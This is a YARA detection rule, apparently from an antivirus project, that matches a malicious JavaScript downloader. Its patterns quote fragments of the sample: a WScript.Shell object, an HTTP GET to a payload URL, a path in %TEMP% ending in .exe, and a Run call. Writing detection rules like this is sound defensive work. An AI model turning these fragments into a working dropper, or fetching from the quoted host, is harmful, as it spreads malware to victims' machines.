rule sig_20160330_1a2d0e8f89955c617a49d52e3a6e012a {
  meta:
    description = "datamaliciousorder - file 20160330_1a2d0e8f89955c617a49d52e3a6e012a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8926bd0609b077eaeeda28d8ddc10a4b07503ab26e652bdc6aeaad7b7eafd668"

  strings:
    $s1  = "var _K0 = function _IS() {return WScript[_AB](\"WScript\"+\".Shell\");}(), _B = 11;" fullword ascii
    $s2  = "function _R(_IW, _BJ){_VO = _VO * 1; return _IW - _BJ;};" fullword ascii
    $s3  = "if (_DY[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "_DY[_V](\"GET\", \"http://topcarshop.ir/m1kas\", false);" fullword ascii
    $s5  = "function _QO(){return _SR + \"\";};" fullword ascii
    $s6  = "function _BV() {return _K0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"3WCqvPdZkVz.ex\" + \"e\";};" fullword ascii
    $s7  = "function _M(_KM){_K0[\"Run\"](_KM, _VO, _VO);};" fullword ascii
    $s8  = "function _S() {return ((_L == true) && (_L == _EB)) ? 1 : _VO;};" fullword ascii
    $s9  = "var _HY = new this[\"Date\"]();" fullword ascii
    $s10 = "function _MR(){return 22;};" fullword ascii
    $s11 = "function _UE(_R0) {var _T = (1, 2, 3, 4, 5, _R0); return _T;};" fullword ascii
    $s12 = "function _UN()" fullword ascii
    $s13 = "function _AY(){return _AB;};" fullword ascii
    $s14 = "return _R(_E, _TL);" fullword ascii
    $s15 = " while (_D){" fullword ascii
    $s16 = "var _L = false;" fullword ascii
    $s17 = "_L = true; " fullword ascii
    $s18 = "var _N = false;" fullword ascii
    $s19 = "_EB = true; " fullword ascii
    $s20 = "var _EB = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}